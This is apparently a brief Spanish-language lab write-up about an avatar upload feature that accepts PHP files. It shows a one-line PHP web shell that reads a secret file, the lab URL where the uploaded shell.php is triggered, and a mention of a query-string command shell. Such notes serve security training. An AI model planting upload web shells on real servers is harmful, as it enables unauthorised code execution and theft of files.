1. En el perfil hay una opcion de cambiar el avatar la cual acepta archivos php, montamos un script rapido para leer el contenido del directorio:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
- Y visitamos la ruta donde se encuentran los avatares junto con el nombre del archivo:
https://0a5500f7035773cc824951dc00ce0028.web-security-academy.net/files/avatars/shell.php

- Tambien podriamos spawnear una shell y concatenarle en la query string el comando que queramos ejecutar:
![[Pasted image 20260801212946.png|257]]

2. .